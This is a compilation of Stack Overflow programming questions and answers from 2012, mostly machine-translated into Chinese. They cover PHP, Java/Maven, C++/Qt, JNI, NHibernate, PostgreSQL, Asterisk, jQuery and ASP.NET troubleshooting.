element.image = base_path.replace('{{X}}', imagePathFragment); 
```

# android - is there a way to discover local network devices in a Adobe Flex Mobile app

> ID：13287590
> 
> 赞同：0
> 
> 时间：2012-11-08T10:52:02.187
> 
> 标签：android, ios, apache-flex, bonjour, upnp

I am trying to write an app for iOS and Android platforms, that discovers local network devices like printers, tv, computers etc.

I would love to use bonjour, but apparently Bonjour can't be used on Android devices (?) when writing an app in adobe flex framework.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T16:34:19.497

您是否看到无法在 Android 上使用 Bonjour 的技术原因？一些安全块？

如果没有，您也许可以直接从 AIR 中工作[——Renaun Erickson 有一篇博客文章](http://renaun.com/blog/2010/03/using-air-20-to-find-services-through-mdnszeroconf-bonjour/)尝试这样做（我没有尝试过）。

# php - stdClass and type hinting

> ID：13287593
> 
> 赞同：11
> 
> 时间：2012-11-08T10:52:12.853
> 
> 标签：php

```
$obj = new stdClass();
echo gettype($obj); //object

function abc(object $obj) {
    return;
}

abc($obj); //Catchable fatal error: Argument 1 passed to abc() must be an instance of object, instance of stdClass given 
```

Why calling `abc($obj)` triggers error?

> Catchable fatal error: Argument 1 passed to abc() must be an instance of object, instance of stdClass given

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-11-08T10:54:38.893

因为类型提示仅适用于类名、接口名或`array`. 在 php 对象模型中没有共同的祖先`object`（就像在 C# 等其他一些编程语言中一样）。你必须指定的是`stdClass`

从[php 7.2](http://php.net/manual/en/migration72.new-features.php)开始，现在可以`object`完全按照您在问题中的猜测使用类型提示：

```
function abc(object $obj) {
    return;
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-08T10:57:25.813

阅读[有关 PHP 中类型提示的文档](http://www.php.net/manual/en/language.oop5.typehinting.php)。您当前的代码强制`abc`函数接受作为类实例的参数`object`（名为`object`! 的类）。改为这样做：

```
function abc(stdClass $obj) 
```

# java - Interactive maven archetype catalog

> ID：13287600
> 
> 赞同：0
> 
> 时间：2012-11-08T10:52:27.897
> 
> 标签：java, maven

I'm creating a maven plugin and I want to allow user to create a project by specifying some details required by my plugin. I understand that when creating a project with simple **mvn archetype:generate** it points to the maven default archtype catalog which asks for groupId, artifactId, etc.

The question here is how do I create my own custom catalog so that I can make creation of a project interactive for the customer.

e.g. When a client points to my archetype catalog like

```
mvn archetype:generate -DarchetypeCatalog=http://abc.com/archetype-catalog.xml 
```

he should be able to see the following,

```
Define value for project_home: C:/XYZ
Define value for server-url: http://localhost:8080/
Define value for groupId: : com.xyz
Define value for artifactId: : sample
Define value for version:  1.0-SNAPSHOT: :
Define value for package:  com.xyz
Confirm properties configuration:
project-home: C:/XYZ
server-url: http://localhost:8080/
groupId: com.xyz
artifactId: sample
version: 1.0-SNAPSHOT
package: com.xyz
 Y: : 
```

Any pointer or some link on web would also be helpful.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:12:56.630

我以 pustefix-archetype-basic 为例，在 META-INF/maven/archetype-metadata.xml 中有以下代码：

```
<requiredProperties>
    <requiredProperty key="groupId">
      <defaultValue>mytld.myorg</defaultValue>
    </requiredProperty>
    <requiredProperty key="artifactId">
      <defaultValue>myapp</defaultValue>
    </requiredProperty>
    <requiredProperty key="version">
      <defaultValue>1.0-SNAPSHOT</defaultValue>
    </requiredProperty>
    <requiredProperty key="package">
      <defaultValue>mytld.myorg.myapp</defaultValue>
    </requiredProperty>
    <requiredProperty key="pustefixVersion">
      <defaultValue>0.18.30</defaultValue>
    </requiredProperty>
  </requiredProperties> 
```

尝试添加您的属性:)

# c++ - Constructor/destructor order dependencies between data members

> ID：13287601
> 
> 赞同：1
> 
> 时间：2012-11-08T10:52:33.467
> 
> 标签：c++, raii

I'm creating a C++ class for executing SSH commands, using libssh2.

The life cycle of a libssh2 SSH session goes through these stages:

1.  Initialization (acquires local resources)
2.  Handshake/Authentication (establishes an SSH session on the remote host)
3.  Disconnect (terminates SSH session on the remote host)
4.  Free (releases local resources; if necessary, also performs step 3).

Before step 1, we have to open a socket, which we pass to libssh2 in step 2\. From then on, we don't need to pass the socket anymore, as libssh2 will store a reference to it. After step 4, we can close the socket.

I'm exposing this through a class (`SSHSession`), and I'd like *setup* (steps 1 and 2) to happen on ctor and *teardown* (steps 3 and 4) to happen on dtor (since step 2 is time-consuming, this will allow me to keep a pool of sessions open and reuse it to execute commands).

My first attempt concentrated all the code on `SSHSession`, and its ctor quickly became a mess, with the "if this step fails, then we must see what has already been done and undo it" routine; the dtor was not as complex, but I still found it too "busy".

Then, I divided the work across several classes, implementing RAII for each acquire/release step, namely:

*   Steps 1 and 4.
*   Steps 2 and 3.

I created a class `SessionConnection` that implemented steps 2 and 3, and had a member of type `SessionHandle` that implemented steps 1 and 4; it also had the socket as a data member, creating the first order dependency on ctor/dtor - the socket could not be destroyed before the `SessionHandle` member.

As I was considering my design, I figured I could arrange steps 2 and 3 like this:

> 2.1\. Handshake (establishes an SSH session on the remote host)
> 
> 2.2\. Authentication
> 
> 3\. Disconnect (terminates SSH session on the remote host)

Which means I could further simplify my `SessionConnection` class, implementing another class to perform RAII on steps 2.1 and 3, and ending up with something like this:

*   Class `SSHSession` has a `SessionConnection` data member.
*   Class `SessionConnection` implements step 2.2.
*   `SessionConnection` has a socket data member.
*   `SessionConnection` has a `SessionHandle` data member, that implements steps 1 and 4\. This must be destroyed before the socket.
*   `SessionConnection` has a `RemoteSessionHandle` data member, that implements steps 2.1 and 3\. This must be created after, and destroyed before, the `SessionHandle` data member.

This greatly simplifies my ctors/dtors, courtesy of RAII. And I find conceptually sound; if, on the one hand, we can look at these as states the SSH session goes through, on the other hand, we can also see them as resources (local, remote) we're managing.

However, I now have a strict construction/destruction order in `SessionConnection`, and while I believe it's an improvement (and I found nothing in my research that stated "this is evil", only "this should be clearly documented"), I'm interested in other opinions, and I'll happily accept info/pointers about possible alternatives to this design.

What I've looked at, so far:

*   ScopeGuard, ScopeExit. It's a similar mechanism, I didn't find anything I could use as an improvement on my design.
*   State Machine. I couldn't find a way to simplify the design with it, and it didn't solve one problem RAII does, namely, cleanup if something fails.

Thanks for your time.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T12:56:26.327

这种设计似乎没有根本性的错误。

如果您想取消对 的成员的构造/销毁顺序的限制`SessionConnection`，您可以执行以下操作：

*   班级`SSHSession`
    *   执行步骤 2.2
    *   有`SSHConnection`会员
*   班级`SSHConnection`
    *   实施步骤 2.1 和 3
    *   有`LocalSessionHandle`会员
*   班级`LocalSessionHandle`
    *   执行步骤 1 和 4
    *   有`Socket`会员

定义的成员及其包含的类的构造/销毁顺序可确保以正确的顺序执行这些步骤。

# c++ - Qt: Which is better for transforming a number to QString, QVariant or QString::number

> ID：13287602
> 
> 赞同：6
> 
> 时间：2012-11-08T10:52:35.427
> 
> 标签：c++, qt

I am just curious. Let's say for example I need to output a number in the console.

The code would be:

```
#include <QDebug>
#include <QVariant>
#include <QString>

void displayNumber(quint8 number) {
    qDebug() << QVariant(number).toString();
    qDebug() << QString::number(number);
//or for example 
//  QLabel label; 
//  label.setText(QString::number(number));
//or 
//  label.setText(QVariant(number).toString());
} 
```

Which would be better performance wise? I think the memory consumption is also different. QVariant(number).toString() would mean that it stores a QVariant in the stack. Not sure about QString::number(), shouldn't it just call the function(sure, the function has a QString return so it is allocated on the stack too and takes that space and that operations to allocated and unallocate it)? Anyway, sizeof() gives me 16 Bytes for QVariant and 4 Bytes for QString.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T10:56:08.433

当然，第二种变体更好。

`QString::number()`是一个返回所需字符串的静态函数。当您使用时，`QVariant(number).toString();`您首先创建一个`QVariant`, 然后将其转换为所需的字符串，因此您创建了一个额外且不必要的`QVariant`类型变量。

此外，您无需将数字转换为字符串即可使用`qDebug`. `qDebug() << 42;`工作正常。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:54:42.150

为什么不简单

```
qDebug << number 
```

? 如果在 a 的情况下`quint8`它输出字符而不是数字本身，那么只需转换 -

```
qDebug << static_cast<int>(number); 
```

或者（这个有点难理解，查积分促销）

```
qDebug << +number; 
```

我敢打赌，与您的任何一个建议相比，这个选项会更好（性能方面）。

# node.js - 如何在具有猫鼬数据库的nodejs中存储最新图像

> ID：13287609
> 
> 赞同：1
> 
> 时间：2012-11-08T10:52:57.237
> 
> 标签：node.js, mongoose

你能解释一下我应该使用什么技术来存储最新的图像吗？基本上，我的目的是为我的网站显示几乎最近更新的图像。问题是我不知道如何在猫鼬数据库中存储最新的图像。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T16:35:17.703

我使用某种猫鼬存储了最新的图像。

```
image.find({reviewed:true },null,{sort:{"submittedDate":-1}}, function (err, images){}

```

# fluent-nhibernate - 无法删除具有多个参考的实体

> ID：13287614
> 
> 赞同：0
> 
> 时间：2012-11-08T10:53:30.530
> 
> 标签：fluent-nhibernate, fluent-nhibernate-mapping

大家早，

我有许多实体，Car 和 Van，每个实体都有一个 Driver 列表。例如，

```
public class Car : Entity
{
    public virtual string Name { get; set; }
    public virtual IList<Driver> Drivers { get; set; }
} 
```

如果将相同的 Driver 添加到 Car 和 Van。当我从汽车上删除司机并且司机存在于货车上时，我得到一个 SQL 引用异常。

在数据库中，我有一个用于 Cars、Vans 和 Drivers 的表，然后是两个连接表`Cars_Drivers`和`Vans_Drivers`.

我可以在映射中做些什么来使其他对象相互了解，因此 delete 不会引发引用异常。

**编辑**- 这是我尝试从汽车中删除驱动程序时遇到的 SQL 异常。

```
NHibernate.Exceptions.GenericADOException: could not delete: [Platform.Core.Driver#2]      [SQL: DELETE FROM Drivers WHERE Id = ?] ---> System.Data.SqlClient.SqlException: The DELETE statement conflicted with the REFERENCE constraint "FKCBD4DA8384042473". The conflict occurred in database "Platform", table "dbo.Vans_Drivers", column 'DriverFK'. The statement has been terminated. 
```

**编辑 2** - 映射和表格

```
public class CarMappingOverrides : IAutoMappingOverride<Car>
{
    public void Override(AutoMapping<Car> mapping)
    {
        mapping.HasManyToMany(x => x.Drivers).Cascade.All();
    }
}

public class VanMappingOverrides : IAutoMappingOverride<Van>
{
    public void Override(AutoMapping<Van> mapping)
    {
        mapping.HasManyToMany(x => x.Drivers).Cascade.All();
    }
} 
```

*   汽车

    *   ID
    *   姓名
*   Cars_Drivers

    *   ID
    *   CarFK
    *   司机FK
*   驱动程序

    *   ID
    *   更多科尔

货车也是如此。

@Handprint - 用于从汽车中移除司机的代码。

```
Driver driver = DriverService.Get(driverId); 
Car car = CarService.Get(carId); 

car.Drivers.Remove(driver); 

CarService.SaveOrUpdate(car); 
```

提前致谢。

富有的

# ruby-on-rails - 使用 rails 和 active_paypal_adaptive_payment 执行预批准付款

> ID：13287615
> 
> 赞同：1
> 
> 时间：2012-11-08T10:53:43.270
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, paypal, paypal-adaptive-payments

如何使用 active_paypal_adaptive_payment 和 rails 执行预先批准的付款？我已预先批准付款设置（由用户授权），但我不知道如何执行付款。我应该使用 execute_payment 方法吗？但是它需要什么参数？我在文档中找不到它。感谢帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T03:50:20.743

需要在“支付”API 调用中设置预批准密钥（[https://www.x.com/developers/paypal/documentation-tools/api/pay-api-operation](https://www.x.com/developers/paypal/documentation-tools/api/pay-api-operation) - 查找预批准付款部分）

顺便说一句，你能告诉我你从哪里得到的 active_payPAl_adaptive_payment 吗？我们可以努力更新它。

# c# - 远程调试信息？

> ID：13287617
> 
> 赞同：0
> 
> 时间：2012-11-08T10:53:47.833
> 
> 标签：c#, visual-studio, remote-debugging

我正在使用 Visual Studio 2012 远程调试器，它工作正常。但我没有得到很多信息。

我同意这样一个事实，即当抛出未处理的异常时我无法获得源代码，但我很惊讶远程调试器没有向我发送行或函数或只是堆栈跟踪。

我得到的只是，例如：

System.core.dll 中未处理的 ArgumentNullException

有没有办法编译可以在远程调试中发送更多信息的程序（使用 VS 2012）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:02:17.527

检查以下几点：

1.  程序集应该在调试模式而不是发布模式下构建
2.  调试符号应出现在目标位置（PDB 文件）
3.  生成远程程序集后不应修改源代码。
4.  我认为您应该具有管理员权限才能完成此操作。

# postgresql - 将 varchar 类型转换为日期

> ID：13287618
> 
> 赞同：3
> 
> 时间：2012-11-08T10:53:52.927
> 
> 标签：postgresql, datetime, postgresql-9.1, type-conversion

我想将 PostgreSQL 数据库中的特定列从`character_varying`type 更改为 type `date`。日期格式为`yyyy:mm:dd`

我试着做：

```
alter table table_name
alter column date_time type date using (date_time::text::date); 
```

但我收到一条错误消息：

> 日期/时间字段值超出范围：“2011:06:15”

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-08T17:21:09.890

当您转换`text`或`varchar`转换`date`为时，安装的默认日期格式是预期的 - 取决于[`datestyle`](http://www.postgresql.org/docs/current/interactive/runtime-config-client.html#GUC-DATESTYLE)您的`postgresql.conf`.

通常，冒号 ( `:`) 是*时间*分隔符，在简单的转换中，PostgreSQL 可能会尝试将 '2011:06:15' 解释为时间 - 并且失败。

要消除歧义，请使用[**`to_date()`**](http://www.postgresql.org/docs/current/interactive/functions-formatting.html#FUNCTIONS-FORMATTING-TABLE)匹配的日期模式：

```
ALTER TABLE table_name
ALTER COLUMN date_time type date
USING to_date(date_time, 'YYYY:MM:DD'); -- pattern for your example 
```

# maven-3 - 运行 mvn clean install 时出错

> ID：13287620
> 
> 赞同：0
> 
> 时间：2012-11-08T10:53:56.873
> 
> 标签：maven-3, maven-plugin, jboss6.x

使用 Eclipse 尝试使用 Eclipse 构建一个 Maven 项目。无论如何，当我尝试运行 mvn clean install 时，我收到以下错误

```
 Failed to execute goal org.jboss.ws.plugins:maven-jaxws-tools-plugin:1.0.1.GA:wsconsume (default) on project sso: Error while running wsconsume: Process terminated with code 1 
```

它调用 MojoExecutionException。

无论如何，我是从一个适用于其他人的 subversion 存储库中获取代码，所以它不是 pom 文件。我做了一些谷歌搜索，它提到它可能是我正在运行的 JBoss 版本，这可能会导致问题。我正在使用 JBoss6.1.0。也使用 Maven 3.0.4

有人有想法么？如果您需要更多信息，请告诉我。谢谢。

编辑：完整的堆栈跟踪

```
 [ERROR] Failed to execute goal org.jboss.ws.plugins:maven-jaxws-tools-plugin:1.0.1.GA:wsconsume (default)                     on project sso: Error while running wsconsume: Process terminated with code 1 -> [Help 1]
      org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.jboss.ws.plugins:maven-jaxws-tools-plugin:1.0.1.GA:wsconsume (default) on project sso: Error while running wsconsume
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:217)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
    at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
    at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
    at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537)
    at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196)
    at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
    at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)
  Caused by: org.apache.maven.plugin.MojoExecutionException: Error while running wsconsume
    at org.jboss.ws.plugins.tools.AbstractWsConsumeMojo.execute(AbstractWsConsumeMojo.java:157)
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:101)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209)
    ... 19 more
  Caused by: java.lang.Exception: Process terminated with code 1
    at org.jboss.ws.plugins.tools.WSContractDelegate.runConsumerOutOfProcess(WSContractDelegate.java:133)
    at org.jboss.ws.plugins.tools.WSContractDelegate.runConsumer(WSContractDelegate.java:99)
    at org.jboss.ws.plugins.tools.AbstractWsConsumeMojo.execute(AbstractWsConsumeMojo.java:149)
    ... 21 more 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T13:05:35.393

反正想通了。原来这是文件名的Windows限制。文件路径太长。因此，一旦我将它移动到根目录下方的文件夹中，例如。C:/folder_here 然后它起作用了。还切换到 JDK 1.7，因为 windows 的另一个问题意味着如果您使用 1.6，您需要下载另外几个 jar。无论如何，希望这对其他人有所帮助。

# iphone - 消息发送成功但给出错误消息 SKPSMTPMessage

> ID：13287622
> 
> 赞同：1
> 
> 时间：2012-11-08T10:54:16.720
> 
> 标签：iphone, xcode, smtp, ios6, xcode4.5

我正在使用`SKPSMTPMessage`类在应用程序中发送邮件。

邮件发送成功但给出错误信息后意味着它首先调用了这个委托方法`SKPSMTPMessage`

```
- (void)messageSent:(SKPSMTPMessage *)message 
```

然后它调用第二个委托消息：-

```
- (void)messageFailed:(SKPSMTPMessage *)message error:(NSError *)error 
```

并在控制台上给出错误消息是：

```
error(555): Failed to send email 
```

我有一个问题，为什么`messageFailed`当消息成功发送到接收者电子邮件 ID 时使用此调用方法？

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-08T11:28:49.107

这些问题背后的原因是，`SKPSMTPMessage`无论何时成功发送电子邮件，结果`connectTimer`都是如此。`not stopped``watchdog``not stopped``trying to send email again`

在文件`[delegate messageSent:self];`中添加以下代码行之前`SKPSMTPMessage.m`，：

```
[self.connectTimer invalidate];
[self stopWatchdog]; 
```

**编辑**：这对我有用

# web-services - 使用 OpenAM WSS 代理启用 Web 服务安全性

> ID：13287623
> 
> 赞同：2
> 
> 时间：2012-11-08T10:54:17.347
> 
> 标签：web-services, security, ws-security, agent, openam

我正在努力使用 OpenAM 设置 Web 服务安全性。这是我到目前为止所做的：

1.  我查阅了 openam 文档，但我找不到任何指向 Web 服务安全实施细节的重要内容。

2.  但是，我在 OpenSSO oracle 网站上找到了此链接 (http://www.oracle.com/technetwork/java/wss-sdn-1-137232.html)，该链接提供了保护 Web 服务的分步说明。

3.  我还发现这篇文章（http://www.stormacq.com/web-services-security-with-opensso-security-token-service-sts/）基本上说在尝试实施时可能会遇到很多问题OpenAM 中的 WSS。

4.  我按照 oracle 链接（上面的第 2 点）并尝试在 OpenAM 版本 10.0.0 中实现 WSS：

我的问题：

*   但是我从 OpenAM 网站获得的 WSS Agent 是 glassfish 版本。如果服务器不是 glassfish，我不确定在我的服务和客户端中提取它并从中包含文件是否会导致任何问题。OpenAM 网站只有 glassfish 版本。

*   另一个问题是 Oracle 教程可能是在 OpenSSO 8.0 时代编写的。不确定它是否适用于 Open AM 10。我已经可以看到目录结构的一些差异。

*   如果有人能指出我在 OpenAM 中实现 WSS 的任何其他可用文档，那将会很有帮助。

*   如果 OpenAM WSS 存在已知问题，是否建议使用 OpenAM 以外的其他 IDM 解决方案来实现 WSS 安全性。

在这里的任何帮助将不胜感激。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T21:08:03.920

WSS 代理实际上是一个 JAX-WS 过滤器实现。它不依赖 GlassFish，您也可以将它与 Tomcat 和 Metro 一起使用。但是我还没有用 Apache CXF 测试过它。

不幸的是，还没有真正的文档。如果您遇到问题，可以将其发布到 OpenAM 邮件列表。

# asterisk - 有没有办法在没有电话的情况下从终端测试星号

> ID：13287635
> 
> 赞同：3
> 
> 时间：2012-11-08T10:55:00.027
> 
> 标签：asterisk

我已经安装了星号我想测试我能够登录。我在 Go GoGrid 中有。当我设置IP时，我得到的扩展名和密码无法到达服务器。我可以通过 ssh 进入机器。

有没有办法从控制台测试星号正在运行并接收连接？我想从终端测试我可以使用该扩展名和密码连接吗？在 GoGrid 上运行 Asterisk 可能存在问题？

谢谢，费德里科

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T16:10:44.737

费德里科。首先，我在 GoGrid 上运行了四个 Asterisk PBX，所以我知道它工作得很好。确保您的 IP 表允许 SIP、IAX2 和 RTP 连接；默认情况下，提供的图像不会。要查看 Asterisk 是否“看到”连接，请使用“asterisk -rvvv”连接到正在运行的 Asterisk 控制台。使用“sip show peers”或“iax2 show peers”查看您的电话和中继是否正确连接。我还发现“iftop”实用程序对于确保远程设备甚至尝试访问您的 PBX eth0 非常有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T08:17:32.220

从 ssh 你可以去星号控制台

```
asterisk -r 
```

检查通过防火墙使用的入站 sip 数据包

```
asterisk -r
sip set debug on 
```

更多信息可以[在 voip info 的星号调试页面上找到](http://www.voip-info.org/wiki/view/Asterisk+debugging)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T22:26:57.157

您还可以通过控制台 SIP 客户端（例如 Linphonec 和 pjsua）检查 Asterisk 是否处于活动状态。

[http://www.linphone.org/eng/documentation/guide/linphonecsh-control.html](http://www.linphone.org/eng/documentation/guide/linphonecsh-control.html) http://www.pjsip.org/pjsua.htm

# assembly - sinus 是可扩展的吗？

> ID：13287639
> 
> 赞同：2
> 
> 时间：2012-11-08T10:55:19.530
> 
> 标签：assembly, numbers, fpu, x87

sinus 我的意思是 c stdlib sin() / fpu assembl;y fsin。

我可以给这个正弦参数大约 16 个十进制数字或更多，例如 sin(1.1e-14); sin(1.2e-14) 然后得到结果，

sinus 在如此小的增量上几乎是线性的，但尽管它也可以以相同的 16 位精度计算，它是否也可以在如此小的增量上精确计算？

（我问这个问题是因为在一段时间内我似乎有点不寻常，因为它在论点和特别是输出值方面都如此精确地计算出来，所以我想知道它是否没有被削减或什么的）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:19:45.910

IIRC, it starts failing when greater than 9e18 and less than 9e-18 for positive numbers. This is a limitation of the CPU.

Details can be read on [http://www.intel.com/design/processor/manuals/253665.pdf](http://www.intel.com/design/processor/manuals/253665.pdf) under 8.1.3.2 Condition Code Flags specifying the limit of FSIN and friends.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T11:13:16.590

sin(x) = x - x^3/3 的泰勒级数！+ x^5/5！- ...

任何数字 0 > *x* > 1 以 10 为底表示为

x = a*10^-n，其中 1<=a<10 例如 x=0.003 = 3*10^-3
x^3 = a^3 * 10^-3n

那么下一项的大小约为 b*10^-3n （忽略阶乘）。随着*n*的增长（或*x*接近于零），下一项开始很快消失。

对于 x=0.003，前几项是

```
 0.003000000000000000 = 10^-3 * 3000000000000000  <-- x
 - 0,000000004500000000 = 10^-3 * 0000004500000000  <-- x^3/3!
 + 0,000000000000002025 = 10^-3 * 0000000000002025  <-- x^5/5!
 ----------------------   -----------------------------
 = 0.002999995500002025 = 10^-3 * 2999995500002025 
```

有 16 位数字忽略前导零和第 4 项 x^7/7！不再影响结果。当 x 变得更小时，接下来是 x^5/5！术语不能添加到结果中，最后是 x^3/3！不能添加（或减去）术语。只有术语 x 可以用 16 位精度表示。

sin(x) = x 仅适用于 x=0。确切地。其他一切都是近似值。即使 sin(pi/2)=1 在数学库中也是近似值，因为参数 pi/2 不能表示为浮点数。

# java - 如果 jvm 的参数是从其他类型转换而来的，jni 找不到类

> ID：13287641
> 
> 赞同：2
> 
> 时间：2012-11-08T10:55:22.520
> 
> 标签：java, c++, qt, jvm, java-native-interface

我对 jni 和 c++/qt 有一个小问题：这是我的代码：

```
void Jvm::create_jvm(QStringList &arguments){
    QTextStream cout(stdout);
    JavaVM *jvm;
    JNIEnv *env;
    JavaVMInitArgs vm_args;
    JavaVMOption *options[4];
    //run begin
    //options[0].optionString = "-Djava.compiler=NONE";
    //options[1].optionString = "-Djava.class.path=app";
    //options[2].optionString = "-verbose:jni";
    //options[3].optionString = "-Xmx512m";
    //run end

    //can't find the class begin
    QByteArray bArray;
    cout<<"Valores del array arguments"<<endl;
    for(int i;i<arguments.size();i++){

        cout<<arguments.at(i)<<endl;
        bArray=arguments.at(i).toStdString().c_str();
        options[i].optionString = bArray.data();
        cout<<options[i].optionString<<endl;
    }
    //can't find the class end

    //jvm args
    vm_args.version = JNI_VERSION_1_6;
    vm_args.nOptions = 4;
    vm_args.options = options;
    vm_args.ignoreUnrecognized = JNI_FALSE;

    jint res = JNI_CreateJavaVM(&jvm, (void**)&env, &vm_args);
    if (res < 0) {//jvm don't created
        qDebug()<<"Can't create Java VM\n";
        exit(1);
    }else{//jvm created
        invoke_class(env);
        jvm->DestroyJavaVM();
    }
}

void Jvm::invoke_class(JNIEnv* env) {
    jclass cls;
    jmethodID mainMethod;
    jobjectArray applicationArgs;
    jstring applicationArg0,applicationArg1,applicationArg2;

    //class and main method
    cls = env->FindClass("HolaMundoSwing");
    if (cls == 0) qDebug()<<"Sorry, I can't find the class"; //In case that class not exist
    mainMethod = env->GetStaticMethodID(cls, "main", "([Ljava/lang/String;)V");

    //Application arguments array
    applicationArgs = env->NewObjectArray(3, env->FindClass("java/lang/String"), NULL);
    applicationArg0 = env->NewStringUTF("From");
    applicationArg1 = env->NewStringUTF("C");
    applicationArg2 = env->NewStringUTF("program");

    env->SetObjectArrayElement(applicationArgs, 0, applicationArg0);
    env->SetObjectArrayElement(applicationArgs, 1, applicationArg1);
    env->SetObjectArrayElement(applicationArgs, 2, applicationArg2);

    env->CallStaticVoidMethod(cls, mainMethod, applicationArgs); //Call to the method
} 
```

我已经测试了这些论点并且是相同的。类路径具有相同的值，但注释代码运行正确，其他代码找不到类，知道吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T12:02:06.277

您的 for 循环包含错误：

```
for( int i; i < arguments.size(); i++ ) 
```

应该

```
for( int i = 0; i < arguments.size(); i++ ) 
```

否则`i`会有任何随机起始值（至少在我的编译器中）

# jquery - 带有“td”过滤器的jQuery“可选”

> ID：13287645
> 
> 赞同：0
> 
> 时间：2012-11-08T10:55:41.510
> 
> 标签：jquery, filter, html-table

`selectable`我对带有“过滤器”的 jQuery 函数有疑问。

在演示中我添加了一些代码，你能告诉我为什么这段代码不起作用吗？

在此示例中效果很好（您可以拖动复选框，然后检查其中的一堆）：http: [//jsfiddle.net/aldimeola1122/ZV7Xj](http://jsfiddle.net/aldimeola1122/ZV7Xj)

在此我不想在“td”中添加“类”，而是使用 td-width(filter)：http: [//jsfiddle.net/aldimeola1122/U6PjL/5/](http://jsfiddle.net/aldimeola1122/U6PjL/5/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T12:16:41.057

`filter`and`cancel`选项只能包含 jQuery 选择器，不能包含任意表达式。您可以使用：

```
filter: 'td[width='+tdWidthLimit+']' 
```

创建一个匹配特定宽度的选择器。但是没有大于给定值的属性的选择器，所以我认为您的`cancel`选择无法完成。最接近的是匹配具有不同宽度的元素：

```
cancel: 'td[width!='+tdWidthLimit+']' 
```

见[http://jsfiddle.net/barmar/U6PjL/6/](http://jsfiddle.net/barmar/U6PjL/6/)

# asp.net - 您将（查看特定）类放在 ASP.NET Web 窗体中的什么位置

> ID：13287657
> 
> 赞同：1
> 
> 时间：2012-11-08T10:56:09.413
> 
> 标签：asp.net, webforms, directory-structure

我们的网站现在变得越来越大，我们必须对 Web 应用程序进行一些结构化。

目前它看起来像这样：

```
- App_Themes
- Content (NuGet, untouched)
  - themes
    - base
- Libs
- Pages
  - A
    - PageOfA1.aspx
    - PageOfA2.aspx
  - B
    - PageOfB1.aspx
    - PageOfB2.aspx
  - LogOn.aspx
  - Site.master
- Resources
  - Images
  - Reports
  - Scripts
  - Styles
- Scripts (NuGet, untouched)
- UserControls 
```

我想看看您的一些目录结构，尤其是我想知道：我们应该将在 *.aspx 页面后面的代码中使用的视图特定类文件 (*.cs) 放在哪里？从现在开始，由于物理上的接近，我们比较满意地将它们放在相应的 *.aspx.cs 文件中。

但是我们即将激活 StyleCop 规则，该规则对每个文件强制执行一个类。那么我应该把这些文件放在哪里呢？

我有意识地没有告诉你我的想法，因为我对所有这些想法都不满意，如果它们与我的想法一致，我无论如何都会忍受这种解决方案的不愉快感觉。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:57:54.360

我建议分开关注。有一个项目用于数据访问，一个用于域模型，一个用于服务，一个用于测试。

查看此链接以获取有关 N 层架构的信息 - [http://www.codeproject.com/Articles/430014/N-Tier-Architecture-and-Tips](http://www.codeproject.com/Articles/430014/N-Tier-Architecture-and-Tips)

# javascript - 使用 Javascript 扩展背景

> ID：13287662
> 
> 赞同：1
> 
> 时间：2012-11-08T10:56:24.697
> 
> 标签：javascript, html, css

我有一个看起来像这样的页面

```
-----------------------------------
|          *************          |          
|          *************          |          
|          *************          |          
|          *************          |          
|          *************          |          
|          *************          |
----------------------------------- 
```

外框是浏览器边缘，因此`<body>`, 和星星是`<body>`元素上居中的背景图像。

